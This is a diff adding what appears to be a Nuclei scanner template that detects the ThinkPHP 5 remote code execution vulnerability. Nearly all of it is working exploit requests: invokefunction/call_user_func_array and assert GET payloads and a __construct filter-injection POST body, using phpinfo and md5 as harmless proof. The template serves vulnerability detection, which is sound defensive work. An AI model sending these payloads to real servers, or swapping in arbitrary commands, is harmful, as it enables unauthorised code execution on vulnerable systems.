@@ -1,0 +1,40 @@
+id: thinkphp-5-rce
+
+info:
+  name: Thinkphp5 5.0.22/5.1.29/5.0 Remote Code Execution Vulnerability
+  author: Natto97
+  severity: critical
+  tags: rce
+
+requests:
+  - method: GET
+    path:
+      - "{{RootURL}}/index.php?s=/Index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1"
+      - "{{RootURL}}/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1"
+      - "{{RootURL}}/index.php?s=index/think\\request/input?data[]=phpinfo()&filter=assert"
+      - "{{RootURL}}/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=assert&vars[1][]=phpinfo()"
+      - "{{RootURL}}/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=assert&vars[1][]=phpinfo()"
+      - "{{RootURL}}/index.php?s=/Index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=31337"
+    matchers:
+      - type: word
+        words:
+          - "PHP Version"
+          - "6f3249aa304055d63828af3bfab778f6"
+        part: body
+
+  - method: POST
+    path:
+      - "{{RootURL}}/index.php?s=captcha"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: "_method=__construct&filter[]=phpinfo&method=get&server[REQUEST_METHOD]=1"
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "PHP Extension"
+          - "PHP Version"
+        condition: and
+      - type: status
+        status:
+          - 200
